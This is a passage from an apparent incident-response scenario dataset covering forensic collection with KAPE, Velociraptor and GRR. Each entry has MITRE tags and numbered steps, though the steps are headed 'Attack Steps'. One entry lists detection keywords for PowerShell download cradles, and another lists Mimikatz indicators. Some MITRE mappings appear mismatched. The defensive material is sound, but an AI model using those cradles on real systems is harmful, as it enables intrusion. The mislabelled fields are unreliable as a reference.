- **Attack Steps**: 1. Access Velociraptor server and client setup. 2. Select clients and deploy Windows.Registry.Persistence artifact. 3. Query keys like Run, RunOnce, Services, and Image File Execution Options. 4. Schedule recurring queries every hour. 5. Review diff reports for newly added entries. 6. Validate any anomalies with known baselines. 7. Export registry snapshots for external comparison. 8. Trigger alert if unknown binaries are set to auto-start.
- **Detection**: Compare with golden images
- **Solution**: Use Velociraptor for live registry monitoring
- **Tags**: velociraptor, registry, persistence, remote

## Browser Artifact Extraction Using KAPE

- **Attack Type**: Evidence Collection
- **Target**: User Workstations
- **Vulnerability**: Social engineering links
- **MITRE**: T1566.001
- **Impact**: Validates user interaction with phishing
- **Tools**: KAPE
- **Scenario**: Analyst needs to extract Chrome and Firefox history to verify phishing link access.
- **Attack Steps**: 1. Open KAPE GUI and select BrowserHistory and WebCache targets. 2. Point to user profile directory. 3. Select modules like BrowsingHistoryView, JLECmd. 4. Run the tool to collect and parse browser artifacts. 5. Review output CSVs for history URLs. 6. Filter entries containing suspicious domains or shortened links. 7. Export all visits within the compromise window. 8. Report on phishing lure effectiveness.
- **Detection**: Look for high click-throughs on malicious URLs
- **Solution**: KAPE provides quick browser activity triage
- **Tags**: browser-history, phishing, kape, evidence

## GRR Hunt for PowerShell Artifacts

- **Attack Type**: Script Artifact Collection
- **Target**: Enterprise Systems
- **Vulnerability**: Living-off-the-land scripting
- **MITRE**: T1059.001
- **Impact**: Uncovers malicious script use across org
- **Tools**: GRR Rapid Response
- **Scenario**: IR team wants to investigate malicious PowerShell use across endpoints.
- **Attack Steps**: 1. Create a hunt targeting PowerShell history and logs. 2. Use the File Finder flow with paths like C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\*.txt and *.log. 3. Include registry keys such as HKCU\Console. 4. Launch the hunt and wait for responses. 5. Review transcripts, logs, and commands used. 6. Flag suspicious encoded or obfuscated PowerShell. 7. Pivot to affected hosts for memory or registry triage. 8. Document malicious script usage.
- **Detection**: Look for base64-encoded PowerShell
- **Solution**: Use GRR for large-scale script activity triage
- **Tags**: powershell, GRR, scripting, detection

## Timeline Building Using Velociraptor + KAPE

- **Attack Type**: Forensic Timeline Creation
- **Target**: Workstations & Servers
- **Vulnerability**: N/A (Post-breach timeline)
- **MITRE**: T1087
- **Impact**: Reconstructs full attacker activity chain
- **Tools**: Velociraptor, KAPE
- **Scenario**: DFIR analysts want to build a timeline using combined data from two tools.
- **Attack Steps**: 1. Use KAPE to collect artifacts like MFT, $LogFile, registry hives, and event logs. 2. Use Velociraptor to remotely collect live memory and recent shellbags. 3. Merge artifacts into a local forensics workstation. 4. Use Plaso or Timesketch to create a unified super timeline. 5. Correlate user actions, process launches, and file access. 6. Highlight suspicious time windows (e.g., midnight bursts). 7. Document anomalies in final report. 8. Share with legal and threat intel teams.
- **Detection**: Use anomaly and gap detection
- **Solution**: Combine tool data for deep timeline reconstruction
- **Tags**: timeline, KAPE, Velociraptor, plaso

## KAPE Triage via USB Plug-n-Play

- **Attack Type**: Offline Artifact Collection
- **Target**: Offline Machines
- **Vulnerability**: Physical access attack
- **MITRE**: T1003
- **Impact**: Enables collection even without network
- **Tools**: KAPE
- **Scenario**: IR responder wants to collect data from a standalone infected system.
- **Attack Steps**: 1. Prepare KAPE and required targets/modules on a USB stick. 2. Plug into infected system booted into a safe recovery OS. 3. Launch KAPE and choose full triage set (e.g., KAPEFull). 4. Set destination to USB or external drive. 5. Begin collection and monitor progress. 6. Verify completion and disconnect safely. 7. Analyze collected artifacts on clean machine. 8. Document volatile and non-volatile data extracted.
- **Detection**: Manual hash validation & artifact parsing
- **Solution**: KAPE allows portable triage via USB
- **Tags**: KAPE, offline-collection, USB, incident-response

## Remote Shellbag Collection Using Velociraptor

- **Attack Type**: Artifact Collection
- **Target**: Workstations
- **Vulnerability**: Shellbag analysis gap
- **MITRE**: T1083
- **Impact**: Reveals attacker browsing behavior
- **Tools**: Velociraptor
- **Scenario**: Analysts want to determine file/folder access patterns to detect attacker activity.
- **Attack Steps**: 1. Deploy Velociraptor client to the targeted endpoint. 2. Access the Web UI and navigate to the specific client. 3. Search for and deploy the Windows.Shellbags artifact. 4. Execute the flow and retrieve the output. 5. Parse the output using Velociraptor’s viewer or export for external tools like ShellBags Explorer. 6. Identify recently accessed folders, external drives, and system directories. 7. Match access patterns with known TTPs. 8. Correlate timestamps with known attack timeline.
- **Detection**: Compare shellbag vs. user claims
- **Solution**: Use Velociraptor for historical folder access
- **Tags**: shellbags, velociraptor, access-patterns

## KAPE Email Artifact Collection

- **Attack Type**: Email Triage
- **Target**: User Workstations
- **Vulnerability**: Social engineering via email
- **MITRE**: T1566.002
- **Impact**: Preserves phishing evidence for legal & technical teams
- **Tools**: KAPE
- **Scenario**: After a phishing incident, responders want to collect local Outlook email databases.
- **Attack Steps**: 1. Open gkape.exe and choose EmailArtifacts target. 2. Set target drive path where Outlook/Thunderbird data resides. 3. Select modules for parsing PST and OST files. 4. Execute the collection process. 5. Review the output folder for recovered PST/OST files. 6. Use external tools (e.g., Kernel PST Viewer) to open and analyze email headers. 7. Identify suspicious senders, attachments, or links. 8. Archive all phishing evidence for reporting.
- **Detection**: Check links/attachments in email bodies
- **Solution**: Use KAPE to extract and triage mailboxes
- **Tags**: email-artifacts, phishing, KAPE

## Detect Lateral Movement via WMI with Velociraptor

- **Attack Type**: Lateral Movement Detection
- **Target**: Workstations & Servers
- **Vulnerability**: Abuse of WMI
- **MITRE**: T1047
- **Impact**: Uncovers stealthy remote execution
- **Tools**: Velociraptor
- **Scenario**: DFIR team suspects attacker used WMI for remote execution.
- **Attack Steps**: 1. Access Velociraptor interface and select the client. 2. Search for and deploy Windows.System.WMIExecLog artifact. 3. Collect and analyze WMI-related logs and event entries. 4. Focus on Event ID 5861 and 5858. 5. Identify any suspicious remote commands or script executions. 6. Correlate results with process logs or parent-child trees. 7. Trace command source system and user context. 8. Document all identified WMI lateral movement attempts.
- **Detection**: Look for unapproved remote script launches
- **Solution**: Use Velociraptor to uncover WMI-based movement
- **Tags**: lateral-movement, WMI, velociraptor

## GRR Hunt for USB Activity

- **Attack Type**: External Device Forensics
- **Target**: Endpoints
- **Vulnerability**: Unmonitored USB insertion
- **MITRE**: T1200
- **Impact**: Detects removable media usage
- **Tools**: GRR Rapid Response
- **Scenario**: Insider threat case requires tracking USB device insertions.
- **Attack Steps**: 1. Access GRR Admin Console and create a new hunt. 2. Use the USBHistory or registry key-based artifacts (e.g., SYSTEM\MountedDevices). 3. Set parameters to query user and system hives. 4. Launch hunt across all suspected endpoints. 5. Review collected results showing device serial numbers, volume labels, and last inserted times. 6. Correlate with file access timestamps. 7. Export USB metadata to CSV for further tracking. 8. Escalate any unknown or rogue devices.
- **Detection**: Look for volume IDs linked to exfil
- **Solution**: Use GRR to spot unauthorized device use
- **Tags**: USB, insider-threat, GRR

## Velociraptor Hunt for PowerShell Logging Misconfig

- **Attack Type**: Detection Evasion
- **Target**: Workstations
- **Vulnerability**: Disabled PowerShell logs
- **MITRE**: T1059.001
- **Impact**: Detects logging tampering
- **Tools**: Velociraptor
- **Scenario**: Threat hunters suspect PowerShell logging has been disabled.
- **Attack Steps**: 1. Access Velociraptor server interface. 2. Create a hunt using the Windows.EventLogs.PSLoggingConfig artifact. 3. Target all endpoints and collect script block logging configuration. 4. Look for registry keys under HKLM\Software\Policies\Microsoft\Windows\PowerShell. 5. Identify endpoints with logging turned off or misconfigured. 6. Correlate with high-scripting activity or malware behavior. 7. Generate a report of non-compliant systems. 8. Recommend remediation via GPO or local policy fix.
- **Detection**: Alert on registry misconfig changes
- **Solution**: Use Velociraptor to audit PowerShell audit settings
- **Tags**: PowerShell, logging, evasion, velociraptor

## KAPE Full Drive Acquisition and Triage

- **Attack Type**: Disk Forensics
- **Target**: Laptops
- **Vulnerability**: Post-compromise artifact loss risk
- **MITRE**: T1003
- **Impact**: Captures full artifact set for post-mortem
- **Tools**: KAPE
- **Scenario**: IR team needs to collect and triage full disk from a compromised laptop.
- **Attack Steps**: 1. Connect a high-capacity external drive to the laptop. 2. Launch KAPE in GUI mode and choose KAPEFull target. 3. Select disk imaging options (e.g., E01 format). 4. Enable parsing modules such as MFTECmd, RECmd, EVTXECmd. 5. Start the collection and monitor for errors or disk issues. 6. Review summary logs for artifact completeness. 7. Validate image with hash verification. 8. Load image into forensic tool for analysis.
- **Detection**: Imaging validation and timeline building
- **Solution**: KAPE for fast triage + image in one step
- **Tags**: kape, disk-imaging, full-triage

## Velociraptor Query for Malicious Scheduled Tasks

- **Attack Type**: Persistence Detection
- **Target**: Windows Systems
- **Vulnerability**: Task scheduler misuse
- **MITRE**: T1053.005
- **Impact**: Detects attacker-maintained persistence
- **Tools**: Velociraptor
- **Scenario**: Suspicious tasks are suspected to be used for malware persistence.
- **Attack Steps**: 1. Log into the Velociraptor web interface. 2. Deploy the Windows.ScheduledTasks artifact to the target. 3. Review the collected task list including task names, triggers, and actions. 4. Identify tasks set to run PowerShell or CMD with obfuscated scripts. 5. Check creation timestamps and user SID ownership. 6. Compare against known good baselines. 7. Export results and alert if persistence confirmed. 8. Initiate removal or disable the malicious tasks.
- **Detection**: Monitor for suspicious task paths
- **Solution**: Velociraptor reveals scheduled persistence points
- **Tags**: scheduled-tasks, persistence, velociraptor

## GRR Rapid Registry Collection During Ransomware Outbreak

- **Attack Type**: Registry Artifact Collection
- **Target**: Enterprise Hosts
- **Vulnerability**: Rapid spread, need for scale
- **MITRE**: T1112
- **Impact**: Registry insight into persistence methods
- **Tools**: GRR Rapid Response
- **Scenario**: IR team needs to collect registry artifacts fleet-wide during an active ransomware event.
- **Attack Steps**: 1. Set up a live hunt across systems using registry key paths tied to persistence (e.g., Run, RunOnce, Services). 2. Choose memory-resident registry hives from both HKLM and HKCU. 3. Use regex filters to extract values with suspicious filenames or random strings. 4. Launch and monitor collection progress from the Admin console. 5. Export collected values into CSV for fast correlation. 6. Cross-check with file hashes or known ransomware IOCs. 7. Tag systems showing strong persistence signals. 8. Escalate findings to containment team.
- **Detection**: Real-time hive delta analysis
- **Solution**: GRR enables fast registry triage in outbreak
- **Tags**: GRR, registry, ransomware, outbreak

## Velociraptor File Access Timeline Creation

- **Attack Type**: File System Forensics
- **Target**: Workstations
- **Vulnerability**: No native access logging
- **MITRE**: T1070.004
- **Impact**: Reveals attacker file interaction timeline
- **Tools**: Velociraptor
- **Scenario**: Analysts want to generate a timeline of accessed files by the attacker.
- **Attack Steps**: 1. Deploy Velociraptor to compromised endpoint. 2. Run the artifact Windows.NTFS.MFT to collect Master File Table entries. 3. Use Windows.NTFS.UsnJrnl for change journal data. 4. Combine timestamps from MFT and USN for created, accessed, and modified times. 5. Sort entries by time to build access timeline. 6. Highlight suspicious access bursts or late-night activity. 7. Cross-reference accessed files with malware indicators. 8. Report the reconstructed access flow to DFIR leads.
- **Detection**: Look for abnormal after-hours access
- **Solution**: Velociraptor builds access timeline from MFT/USN
- **Tags**: velociraptor, timeline, file-access

## KAPE Registry ShimCache Extraction

- **Attack Type**: Execution Trace Collection
- **Target**: Windows Hosts
- **Vulnerability**: Execution history often ignored
- **MITRE**: T1204
- **Impact**: Reveals program execution traces
- **Tools**: KAPE
- **Scenario**: IR team wants to recover traces of past executable launches via ShimCache.
- **Attack Steps**: 1. Run KAPE and target SystemHive + ShimCacheParser module. 2. Extract SYSTEM registry hive from system drive. 3. KAPE parses ShimCache (AppCompatCache) entries automatically. 4. Output shows list of executables and last modified timestamps. 5. Identify unsigned or odd file paths. 6. Filter by execution timeframe of the incident. 7. Compare with legitimate application paths. 8. Flag anomalous binaries for malware review.
- **Detection**: Use timeline correlation
- **Solution**: Use KAPE to extract and analyze ShimCache fast
- **Tags**: shimcache, kape, appcompatcache, forensics

## Velociraptor Query for $LogFile Analysis

- **Attack Type**: File System Timeline
- **Target**: Workstations
- **Vulnerability**: File renaming/deletion hiding
- **MITRE**: T1070.004
- **Impact**: Discovers attacker cleanup behavior
- **Tools**: Velociraptor
- **Scenario**: Analyst needs to determine if files were renamed or deleted during breach.
- **Attack Steps**: 1. Login to Velociraptor server and identify the target system. 2. Deploy the Windows.NTFS.LogFile artifact. 3. Run the query to collect $LogFile metadata from the NTFS volume. 4. Export the log and parse with tools like LogFileParser or analyze inline. 5. Look for patterns of Rename, Delete, or Create operations. 6. Match these with suspicious file paths or malware drop locations. 7. Use timestamps to enrich the attacker timeline. 8. Report recovered evidence to legal and SOC.
- **Detection**: Timestamp correlation, IOC matching
- **Solution**: Use Velociraptor to access low-level NTFS logs
- **Tags**: NTFS, $LogFile, timeline, velociraptor

## KAPE Analysis of UserAssist Registry Key

- **Attack Type**: Execution Artifact Review
- **Target**: User Workstations
- **Vulnerability**: Executable usage obscured
- **MITRE**: T1059
- **Impact**: Shows user interaction with apps
- **Tools**: KAPE
- **Scenario**: Analyst wants to confirm whether a user executed a suspicious file.
- **Attack Steps**: 1. Open KAPE GUI and select the UserAssist registry target. 2. Point KAPE to the user's NTUSER.DAT registry hive. 3. Enable the RECmd module to parse the data. 4. Run KAPE and monitor processing. 5. Review parsed data in output for recently launched apps. 6. Check for ROT13-encoded executable paths. 7. Identify the timestamp and frequency of usage. 8. Flag any unknown or suspicious executables.
- **Detection**: Compare entries with baseline use
- **Solution**: KAPE quickly decodes UserAssist registry info
- **Tags**: kape, userassist, registry, execution

## GRR Hunt for Known IOC Hashes

- **Attack Type**: IOC-Based Detection
- **Target**: Enterprise Hosts
- **Vulnerability**: Undetected malware files
- **MITRE**: T1036
- **Impact**: Allows org-wide scan for known threats
- **Tools**: GRR Rapid Response
- **Scenario**: Threat intel team wants to scan endpoints for malicious file hashes.
- **Attack Steps**: 1. Launch the GRR Admin console and define a new hunt. 2. Use the FileFinder flow and input SHA256/MD5 hashes from threat intel. 3. Set the directory paths to common drop zones (C:\Users, C:\Temp, etc.). 4. Enable hashing and comparison in the flow config. 5. Deploy hunt to target endpoints. 6. Review hit results, showing file paths and metadata. 7. Collect matching files for deeper analysis. 8. Initiate isolation or containment if malware is confirmed.
- **Detection**: IOC match reports, SIEM alerts
- **Solution**: GRR automates fleet-wide hash search
- **Tags**: IOC, hash-search, GRR, malware

## Velociraptor LNK File Timeline Reconstruction

- **Attack Type**: Shortcut Artifact Analysis
- **Target**: Workstations
- **Vulnerability**: LNK-based execution trace
- **MITRE**: T1204.002
- **Impact**: Reveals app/file execution via shortcuts
- **Tools**: Velociraptor
- **Scenario**: IR analyst needs to understand what files were accessed using Windows shortcuts.
- **Attack Steps**: 1. Select the endpoint in the Velociraptor UI. 2. Deploy the Windows.LNK artifact to collect .lnk files. 3. Run the query and download collected LNK metadata. 4. Use Velociraptor's parser to decode the link targets. 5. Extract timestamps of file access, execution path, and volume serial info. 6. Correlate with user activity or compromise timeframe. 7. Document any suspicious shortcuts created during intrusion. 8. Cross-reference with shellbags or prefetch for deeper validation.
- **Detection**: Detect shortcut creation by malware
- **Solution**: Velociraptor decodes forensic .lnk artifacts
- **Tags**: shortcut, lnk, velociraptor, timeline

## KAPE Collection of AmCache and SRUM

- **Attack Type**: Program Execution Artifacts
- **Target**: Endpoints
- **Vulnerability**: Lack of EDR on older systems
- **MITRE**: T1057
- **Impact**: Uncovers stealth app execution
- **Tools**: KAPE
- **Scenario**: Analysts want to validate execution of unknown executables via registry and SRUM data.
- **Attack Steps**: 1. Launch KAPE and select AmCache and SRUM targets. 2. Choose SYSTEM and SOFTWARE hives from system path. 3. Enable AmCacheParser and SRUMParser modules. 4. Run collection and review parsed outputs. 5. In AmCache, look for unknown programs, hashes, install times. 6. In SRUM, check network usage per process. 7. Correlate data to detect unknown but active executables. 8. Use timeline to identify when they first appeared.
- **Detection**: Timeline gaps + unknown hashes
- **Solution**: KAPE helps confirm app run history
- **Tags**: amcache, srum, kape, execution

## Velociraptor Hunt for Suspicious Network Connections

- **Attack Type**: Remote Connection Detection
- **Target**: Enterprise Systems
- **Vulnerability**: C2 communication
- **MITRE**: T1071
- **Impact**: Identifies live malicious network activity
- **Tools**: Velociraptor
- **Scenario**: SOC wants to detect endpoints making connections to known C2 IPs.
- **Attack Steps**: 1. Log into Velociraptor and define a new hunt. 2. Use the Windows.Network.Netstat artifact to collect live network connections. 3. Filter results against known malicious IPs from threat intel. 4. Retrieve results from all online clients. 5. Validate whether connections are still active or historical. 6. Extract process names tied to those connections. 7. Investigate further with memory or file triage. 8. Tag endpoints for isolation if confirmed active threats.
- **Detection**: IP matching with threat feeds
- **Solution**: Velociraptor links net connections to process
- **Tags**: network, velociraptor, C2, threat-hunting

## GRR-Based Host Timeline Acquisition

- **Attack Type**: Super Timeline Generation
- **Target**: Servers & Workstations
- **Vulnerability**: No timeline visibility
- **MITRE**: T1499
- **Impact**: Reconstructs attack chronology
- **Tools**: GRR Rapid Response
- **Scenario**: DFIR team wants to construct a full activity timeline without disk imaging.
- **Attack Steps**: 1. Create a custom hunt in GRR to collect: MFT, $LogFile, registry hives, Event Logs, prefetch. 2. Define paths for each artifact type (e.g., C:\Windows\System32\Config). 3. Start the hunt across all potentially compromised systems. 4. After collection, download artifacts to forensic machine. 5. Use log2timeline/Plaso to build super timeline. 6. Identify periods of intense activity or off-hour spikes. 7. Correlate with known malicious events or alerts. 8. Document findings and present activity sequence.
- **Detection**: Compare with alert timestamps
- **Solution**: GRR supports full timeline via remote artifact pull
- **Tags**: super-timeline, GRR, plaso, DFIR

## KAPE Triage from System Restore Points

- **Attack Type**: Hidden Artifact Recovery
- **Target**: Workstations
- **Vulnerability**: Malware deleted after infection
- **MITRE**: T1070
- **Impact**: Recovers traces from old system states
- **Tools**: KAPE
- **Scenario**: Analysts need to recover deleted malware from Windows restore points.
- **Attack Steps**: 1. Access infected system and mount restore points (e.g., using ShadowCopyView). 2. Set KAPE source path to mounted shadow volume. 3. Select common triage targets (MFT, Registry, Prefetch, AmCache). 4. Enable modules for parsing deleted entries. 5. Run KAPE and analyze output for malware files or traces. 6. Compare with current file system to spot deleted artifacts. 7. Recover historical registry and execution traces. 8. Save evidence for legal and root cause analysis.
- **Detection**: Compare active vs. restore point data
- **Solution**: KAPE enables evidence recovery from shadow copies
- **Tags**: kape, restore-point, deleted-files, forensics

## Velociraptor Detection of Process Injection

- **Attack Type**: Memory Analysis
- **Target**: Windows Hosts
- **Vulnerability**: Code injection
- **MITRE**: T1055
- **Impact**: Identifies advanced malware tactics
- **Tools**: Velociraptor
- **Scenario**: Team suspects malware injected into legitimate processes.
- **Attack Steps**: 1. Deploy Velociraptor to the affected endpoint. 2. Use the Windows.Memory.YARA artifact and add rules for process injection detection. 3. Run scan across all running memory segments. 4. Analyze output for matches in unexpected processes (e.g., explorer.exe). 5. Collect memory dump of the suspicious process. 6. Load into Volatility for deeper module and section analysis. 7. Confirm indicators of hollowing or code injection. 8. Document technique and affected binary.
- **Detection**: Memory YARA detection
- **Solution**: Velociraptor supports live injection scanning
- **Tags**: process-injection, memory, velociraptor

## KAPE-Based Browser Download History Review

- **Attack Type**: User Behavior Analysis
- **Target**: User Workstations
- **Vulnerability**: Initial payload downloads
- **MITRE**: T1204
- **Impact**: Confirms user clicked & downloaded malware
- **Tools**: KAPE
- **Scenario**: Analysts want to confirm if the user downloaded a malicious payload.
- **Attack Steps**: 1. Select BrowserArtifacts target including Chrome/Edge/Firefox. 2. Choose modules like BrowsingHistoryView and JLECmd. 3. Set collection path to user profile directory. 4. Execute collection and review parsed output for download history. 5. Filter results for .exe, .zip, .js file downloads. 6. Check download URLs against threat intelligence feeds. 7. Correlate download time with initial infection. 8. Add matching evidence to user activity timeline.
- **Detection**: Compare timestamps to prefetch or alerts
- **Solution**: KAPE reveals full browser download trail
- **Tags**: browser, downloads, kape, user-trace

## Velociraptor Detection of Unusual User Logons via Event Logs

- **Attack Type**: Detection
- **Target**: Windows Endpoints
- **Vulnerability**: Weak credential hygiene
- **MITRE**: T1078
- **Impact**: Early detection of compromised accounts
- **Tools**: Velociraptor
- **Scenario**: Use Velociraptor to detect suspicious user logon events based on filtering Windows Event Logs.
- **Attack Steps**: 1. Deploy Velociraptor on the endpoint using either MSI installer or fleet deployment.2. Open the Velociraptor GUI and navigate to the query interface.3. Use the built-in hunt Windows.EventLogs.Security to collect 4624 and 4625 events.4. Add filters to isolate logons from non-local IPs, late-night hours, or accounts that don’t normally log in.5. Run the query and gather results into a timeline.6. Correlate with user activity using timestamps and work schedule patterns.7. Flag anomalous logons for further review.8. Export artifacts and event logs to your forensic evidence container.
- **Detection**: Logon type analysis, account correlation
- **Solution**: Disable suspicious accounts; enforce MFA and account lockouts
- **Tags**: logon events, velociraptor, 4624, anomalous behavior

## GRR Artifact Collection for Lateral Movement Tracing

- **Attack Type**: Investigation
- **Target**: Windows & Linux Servers
- **Vulnerability**: Unsecured internal network segmentation
- **MITRE**: T1021
- **Impact**: Maps attacker movement across hosts
- **Tools**: GRR Rapid Response
- **Scenario**: Use GRR Rapid Response to remotely collect artifacts like ARP cache, routing tables, and network logs to trace lateral movement.
- **Attack Steps**: 1. Open the GRR Admin Console and select the compromised machine from the client list.2. Launch the Network.ARPTable and Network.RoutingTable artifact collectors.3. Execute the Linux.Netstat or Windows.Netstat flow depending on OS.4. Collect all known open ports, established connections, and routing history.5. Dump DNS resolver cache to identify previously contacted hosts.6. Compile a network map using collected artifacts and IP-to-hostname mapping.7. Investigate any peer-to-peer lateral connections or abnormal subnets.8. Cross-reference with other host data to determine movement paths.
- **Detection**: Network flows and ARP logs via GRR
- **Solution**: Segment subnets and use NAC controls
- **Tags**: grr, lateral movement, arp, netstat

## KAPE Browser Artifact Sweep for Exfiltration Detection

- **Attack Type**: Detection
- **Target**: Workstation
- **Vulnerability**: Cloud-based exfiltration
- **MITRE**: T1048
- **Impact**: Prevents unnoticed data theft
- **Tools**: KAPE
- **Scenario**: Detect data exfiltration attempts through browser-based uploads using KAPE to collect browser artifacts and download/upload history.
- **Attack Steps**: 1. Run KAPE with Target = BrowserHistry and Module = Analyze_BrowserData.2. Configure KAPE to collect from Chrome, Edge, Firefox directories.3. Export collected artifacts into a portable evidence directory.4. Use internal parsing tools or third-party viewers to examine recent downloads and uploads.5. Identify any uploads to suspicious domains or cloud drives like Dropbox or Mega.6. Correlate timestamps with internal logs to confirm user activity.7. Check for external file-sharing services rarely used in the org.8. Document exfil paths, timestamps, and involved accounts.
- **Detection**: Browser upload history, outbound DNS requests
- **Solution**: Block listed domains, educate users
- **Tags**: kape, browser history, exfiltration

## Velociraptor PowerShell Abuse Detection

- **Attack Type**: Detection
- **Target**: Windows Endpoints
- **Vulnerability**: Lack of PowerShell logging controls
- **MITRE**: T1059.001
- **Impact**: Detects fileless attacks and scripts
- **Tools**: Velociraptor
- **Scenario**: Use Velociraptor to detect signs of PowerShell abuse commonly linked to attack chains and malware stages.
- **Attack Steps**: 1. Navigate to the Velociraptor console and go to the hunt manager.2. Select the artifact Windows.Powershell.ScriptBlockLog.3. Execute a hunt on endpoints or select hosts to gather PowerShell command logs.4. Use keyword filters (e.g., "Invoke-Expression", "DownloadString", "New-Object Net.WebClient").5. Isolate suspicious script blocks and decode base64 payloads if present.6. Create a timeline of execution to see lateral or staged behavior.7. Correlate with user context and scheduled task artifacts.8. Export evidence for malware reverse engineering.
- **Detection**: ScriptBlock logging, encoded PowerShell detection
- **Solution**: Enable PowerShell logging, restrict scripting
- **Tags**: powershell, velociraptor, encoded commands

## GRR Scheduled Hunt for USB Device History

- **Attack Type**: Monitoring
- **Target**: Workstations
- **Vulnerability**: Use of rogue removable media
- **MITRE**: T1200
- **Impact**: Prevents insider-driven data theft
- **Tools**: GRR Rapid Response
- **Scenario**: Monitor USB device plug-in history across the enterprise using GRR artifact scheduling.
- **Attack Steps**: 1. Login to the GRR web console and define a new hunt.2. Choose artifact Windows.USBDevices from the available options.3. Set a scheduled interval (e.g., every 12 hours) for all corporate workstations.4. Enable automatic artifact collection and retention policy.5. Collect device names, serials, mount times, and user context.6. Search for unauthorized USB brands or storage types.7. Export results into your SIEM or DFIR timeline tool.8. Alert security team if unknown storage is repeatedly used.
- **Detection**: Registry keys, setup logs, device IDs
- **Solution**: Implement USB policy and allowlisting
- **Tags**: usb forensics, grr, removable media

## KAPE Collection of Prefetch Files for Execution Timeline

- **Attack Type**: Forensics
- **Target**: Windows Workstation
- **Vulnerability**: User downloaded & ran malicious apps
- **MITRE**: T1204
- **Impact**: Tracks application execution history
- **Tools**: KAPE
- **Scenario**: Use KAPE to collect and analyze Prefetch files to reconstruct application execution history on a suspect system.
- **Attack Steps**: 1. Use KAPE with Target = Prefetch and Module = AppCompatParser.2. Run collection on the suspect endpoint or forensic image.3. Extract .pf files from C:\Windows\Prefetch.4. Use Eric Zimmerman's PECmd.exe to parse timestamps and execution counts.5. Build a timeline of first/last executed apps.6. Highlight newly introduced binaries or unusual apps.7. Correlate with file creation, downloads, and event logs.8. Document app launch history in case summary.
- **Detection**: Prefetch file metadata
- **Solution**: App allowlisting, endpoint monitoring
- **Tags**: prefetch, kape, application history

## Velociraptor Detection of Mimikatz via Named Pipe Use

- **Attack Type**: Detection
- **Target**: Windows Machine
- **Vulnerability**: Credential theft in-memory
- **MITRE**: T1003.001
- **Impact**: Prevents in-memory password extraction
- **Tools**: Velociraptor
- **Scenario**: Use Velociraptor to detect the presence of credential theft tools like Mimikatz through pipe and memory inspection.
- **Attack Steps**: 1. Deploy Velociraptor agent on suspected machine.2. Use artifact Windows.NamedPipes to collect named pipes.3. Filter for named pipes like \mimispool, \lsass, or \pipe\srvsvc.4. Cross-check against running processes for credential dumping behavior.5. Examine memory artifacts for strings linked to Mimikatz (sekurlsa, kerberos, etc).6. Generate alert if strong indicators are present.7. Dump process memory if needed for later analysis.8. Archive findings and report IOC hits.
- **Detection**: Named pipe analysis, memory indicators
- **Solution**: Disable LSASS access, enable Credential Guard
- **Tags**: mimikatz, velociraptor, pipe

## GRR Remote Scheduled Memory Collection

- **Attack Type**: Incident Response
- **Target**: Workstations & Servers
- **Vulnerability**: Malware residing in memory
- **MITRE**: T1003, T1055
- **Impact**: Captures volatile attacker artifacts
- **Tools**: GRR Rapid Response
- **Scenario**: Collect memory snapshots from endpoints remotely using GRR's scheduled memory collection feature.
- **Attack Steps**: 1. Log in to GRR and go to the 'Hunts' section.2. Create a new hunt targeting suspect hosts or the whole fleet.3. Select MemoryCollector flow.4. Configure output directory and retention.5. Set collection time for low-usage periods to avoid disruption.6. Store memory dumps in GRR’s VFS or export via SFTP.7. Analyze with Volatility or Rekall post-extraction.8. Use for malware injection or rootkit identification.
- **Detection**: Volatility analysis, injected module scanning
- **Solution**: Schedule memory checks, alert on changes
- **Tags**: grr, memory dump, remote

## Velociraptor Query for Rarely Used Auto-Start Locations

- **Attack Type**: Threat Hunting
- **Target**: Windows Hosts
- **Vulnerability**: Persistence through obscure methods
- **MITRE**: T1547
- **Impact**: Early detection of hidden persistence
- **Tools**: Velociraptor
- **Scenario**: Hunt for persistence techniques by querying less common auto-start registry keys or folders via Velociraptor.
- **Attack Steps**: 1. Navigate to the Velociraptor interface and start a new hunt.2. Query Windows.Registry.RunKeys and Windows.StartupFolder.3. Add custom artifact for Windows.Registry.ScheduledTasks.4. Look for entries that point to uncommon paths or rarely used folders.5. Compare against a whitelist of known enterprise apps.6. Flag new or suspicious entries.7. Expand hunt across fleet to identify lateral persistence.8. Document and prepare cleanup procedures.
- **Detection**: Registry auto-start keys and startup folders
- **Solution**: Regular audit of startup locations
- **Tags**: velociraptor, autorun, persistence

## KAPE Acquisition of Amcache and Shimcache for Execution Evidence

- **Attack Type**: Forensics
- **Target**: Windows Endpoints
- **Vulnerability**: Malware that self-deletes after execution
- **MITRE**: T1202
- **Impact**: Detects deleted but executed binaries
- **Tools**: KAPE
- **Scenario**: Use KAPE to collect Amcache and Shimcache data to identify previously executed programs, including deleted ones.
- **Attack Steps**: 1. Run KAPE with Target = Amcache,Shimcache.2. Collect registry hives and system files from live system or image.3. Use RECmd.exe or other tools to parse Amcache (Amcache.hve) and Shimcache (AppCompatCache).4. Extract program paths, first/last run times, and metadata.5. Identify deleted executables or programs run from temp locations.6. Correlate with timeline and malware execution patterns.7. Cross-reference with threat intel for suspicious file hashes.8. Report all findings in execution timeline.
- **Detection**: Amcache and Shimcache correlation
- **Solution**: Use AppLocker, alert on temp execution
- **Tags**: kape, shimcache, amcache, forensics

## Fleet-wide Collection of MFT for Timeline Analysis

- **Attack Type**: Remote Artifact Collection
- **Target**: Enterprise Windows Fleet
- **Vulnerability**: Unauthorized file access
- **MITRE**: T1005
- **Impact**: Reveals file-level tampering and attacker movement
- **Tools**: Velociraptor
- **Scenario**: An IR team needs to collect MFT (Master File Table) from all machines in a compromised network for timeline analysis.
- **Attack Steps**: 1. Deploy Velociraptor server and agents across the enterprise. 2. Navigate to the Velociraptor GUI and define a hunt targeting Windows.NTFS.MFT. 3. Set collection filters such as C:\ volume only. 4. Launch the hunt and monitor completion per endpoint. 5. Download the MFT results from each endpoint. 6. Use tools like analyzeMFT or MFTECmd to parse results. 7. Generate super timelines using tools like Plaso or Timesketch. 8. Identify suspicious file activities or timestomping. 9. Correlate MFT with other artifacts (event logs, registry). 10. Use findings to recreate attacker file activity.
- **Detection**: Endpoint MFT access logs; timeline overlap
- **Solution**: Centralize MFT collection and retention policies
- **Tags**: timeline, MFT, velociraptor, hunting

## Browser History Forensics Using KAPE

- **Attack Type**: Post-Incident Triage
- **Target**: Windows Workstation
- **Vulnerability**: User clicked malicious link
- **MITRE**: T1056.001
- **Impact**: Exposes phishing access and data leakage
- **Tools**: KAPE
- **Scenario**: Analysts need to determine if a user accessed phishing websites during a breach window.
